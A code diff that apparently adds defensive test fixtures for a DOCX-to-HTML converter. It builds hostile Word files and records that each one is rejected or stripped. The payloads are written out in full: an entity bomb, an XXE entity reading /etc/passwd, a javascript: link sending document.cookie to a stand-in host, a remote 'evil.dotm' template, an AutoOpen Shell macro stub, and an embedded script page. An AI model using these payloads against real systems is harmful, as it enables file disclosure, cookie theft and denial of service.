@@ -2847,6 +2847,172 @@ work(
     "unknown",
 )
 
+# --- documents: DOCX ------------------------------------------------------------------------------
+# A Word document is a ZIP of XML like a workbook, with the same bombs. Its own trouble is what
+# it carries besides its text: links that are code, pictures and templates fetched from other
+# sites when it is opened, macros, and words its author deleted or hid and believes are gone.
+# Each is converted to HTML.
+G = "documents"
+NOT_DOC = "This file is not a valid DOCX document"
+WNS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
+
+
+def doc_parts():
+    with _zipfile.ZipFile(os.path.join(FIXTURES, "docx/sample.docx")) as z:
+        return {name: z.read(name) for name in z.namelist()}
+
+
+def doc(change=None, extra=None) -> bytes:
+    parts = doc_parts()
+    for name, body in (change or {}).items():
+        if body is None:
+            parts.pop(name, None)
+        else:
+            parts[name] = body
+    parts.update(extra or {})
+    out = _io.BytesIO()
+    with _zipfile.ZipFile(out, "w", _zipfile.ZIP_DEFLATED) as z:
+        for name, body in parts.items():
+            info = _zipfile.ZipInfo(name, (2026, 11, 23, 12, 0, 0))
+            info.compress_type = _zipfile.ZIP_DEFLATED
+            z.writestr(info, body)
+    return out.getvalue()
+
+
+def body_of(inner: str, before: str = "") -> bytes:
+    return ('<?xml version="1.0"?>%s<w:document %s><w:body>%s</w:body></w:document>' % (before, WNS, inner)).encode()
+
+
+def words(text):
+    return "<w:p><w:r><w:t>%s</w:t></w:r></w:p>" % text
+
+
+def docu(name, data, why, detect, **more):
+    trap(name, data, why, detect, group=G, **more)
+
+
+SAMPLE_DOC = doc()
+RELS = doc_parts()["word/_rels/document.xml.rels"]
+docu(
+    "truncated.docx",
+    SAMPLE_DOC[: len(SAMPLE_DOC) // 2],
+    "A Word document cut off half-way.",
+    "docx", node="fails", note=NOT_DOC,
+)
+docu(
+    "entity-bomb.docx",
+    doc({"word/document.xml": body_of(words("&a8;"), "<!DOCTYPE l [" + xml_entities.decode() + "]>")}),
+    'The "billion laughs" as a paragraph: one line that stands for a gigabyte of the letter a.',
+    "docx", node="fails", note=NOT_DOC,
+)
+docu(
+    "reads-a-local-file.docx",
+    doc({"word/document.xml": body_of(words("&x;"), '<!DOCTYPE l [<!ENTITY x SYSTEM "file:///etc/passwd">]>')}),
+    "A paragraph that asks the reader to fetch a file from the computer and print it.",
+    "docx", node="fails", note=NOT_DOC,
+)
+docu(
+    "bomb-inside.docx",
+    doc({"word/document.xml": body_of(words("x") + " " * (300 * 1024 * 1024))}),
+    "A document whose text part is three hundred megabytes of spaces, packed to 290 kilobytes.",
+    "docx", node="fails", note="This document is too large to convert in a browser",
+)
+docu(
+    "link-that-is-code.docx",
+    doc({"word/_rels/document.xml.rels": RELS.replace(b"https://omsett.com", b"javascript:fetch('http://elsewhere.example/'+document.cookie)")}),
+    "A link whose address is a script. In Word it does nothing; on the web page made from the "
+    "document it would run. The words are kept and the address is not.",
+    "docx", node="succeeds", absent="javascript",
+)
+docu(
+    "fetches-a-picture.docx",
+    doc({"word/_rels/document.xml.rels": RELS.replace(b'Target="media/image1.png"', b'Target="http://elsewhere.example/seen.png" TargetMode="External"')}),
+    "A picture that is not in the document but on another site, fetched each time the document "
+    "is opened, which tells that site who opened it and when. It is not fetched, and its "
+    "address is not carried into the page.",
+    "docx", node="succeeds", absent="elsewhere.example",
+)
+docu(
+    "fetches-a-template.docx",
+    doc(extra={
+        "word/settings.xml": ('<?xml version="1.0"?><w:settings %s><w:attachedTemplate r:id="rId1"/></w:settings>' % WNS).encode(),
+        "word/_rels/settings.xml.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://elsewhere.example/evil.dotm" TargetMode="External"/></Relationships>',
+        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"Sub AutoOpen() Shell(cmd) End Sub" * 20,
+    }),
+    "A document that loads its template, macros included, from another site when opened, and "
+    "carries a macro of its own. Neither part is ever opened.",
+    "docx", node="succeeds", absent="AutoOpen",
+)
+docu(
+    "web-page-inside.docx",
+    doc(
+        {"word/document.xml": body_of(words("The visible text.") + '<w:altChunk r:id="rId9"/>')},
+        {"word/afchunk.html": b"<html><body><script>alert(1)</script><h1>Smuggled</h1></body></html>"},
+    ),
+    "A document with a whole web page tucked inside it, script and all, for Word to paste in "
+    "when it opens. It is not read.",
+    "docx", node="succeeds", absent="Smuggled",
+)
+docu(
+    "what-was-deleted.docx",
+    doc({"word/document.xml": body_of(
+        '<w:p><w:r><w:t xml:space="preserve">The price is </w:t></w:r><w:del w:id="1"><w:r><w:delText>SECRET-OLD-PRICE</w:delText></w:r></w:del>'
+        '<w:ins w:id="2"><w:r><w:t>agreed</w:t></w:r></w:ins><w:r><w:rPr><w:vanish/></w:rPr><w:t> SECRET-HIDDEN-NOTE</w:t></w:r></w:p>'
+    )}),
+    "Words deleted with changes tracked, and words formatted as hidden. Both are still in the "
+    "file, and neither is what the document says. Neither is carried across.",
+    "docx", node="succeeds", absent="SECRET-",
+)
+docu(
+    "tables-two-hundred-deep.docx",
+    doc({"word/document.xml": body_of("<w:tbl><w:tr><w:tc>" * 200 + words("deep") + "</w:tc></w:tr></w:tbl>" * 200)}),
+    "A table inside a table, two hundred times over.",
+    "docx", node="fails", note=NOT_DOC,
+)
+docu(
+    "no-text-part.docx",
+    doc({"word/document.xml": None}),
+    "A document with its styles and pictures and without the part that holds its text.",
+    "docx", node="fails", note=NOT_DOC,
+)
+docu(
+    "empty-paragraphs.docx",
+    doc({"word/document.xml": body_of("<w:p/>" * 50)}),
+    "Fifty paragraphs with nothing in any of them.",
+    "docx", node="fails", note="This document has no text in it to convert",
+)
+docu(
+    "picture-named.docx",
+    GOOD,
+    "A PNG with a .docx name.",
+    "png", node="succeeds", mismatch=True,
+)
+docu(
+    "archive-named.docx",
+    GOOD_ZIP,
+    "An ordinary ZIP with a .docx name.",
+    "zip", node="succeeds", mismatch=True,
+)
+docu(
+    "workbook-named.docx",
+    SAMPLE_BOOK,
+    "A workbook with a .docx name. Both are ZIPs of XML, and they are told apart by what is "
+    "inside.",
+    "xlsx", node="succeeds", mismatch=True,
+)
+docu(
+    "document-named.zip",
+    SAMPLE_DOC,
+    "A sound Word document with a .zip name. It is converted as the document it is.",
+    "docx", node="succeeds", mismatch=True,
+)
+docu(
+    "older-word.doc",
+    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16 + b"\x3e\x00\x03\x00\xfe\xff\x09\x00" + b"\0" * 480 + b"W\0o\0r\0d\0D\0o\0c\0u\0m\0e\0n\0t\0" + b"\0" * 480,
+    "The older kind of Word document, from before 2007, which is not a ZIP at all.",
+    "unregistered",
+)
+
 with open(os.path.join(OUT, "manifest.json"), "w") as out:
     json.dump(manifest, out, indent=2)
     out.write("\n")
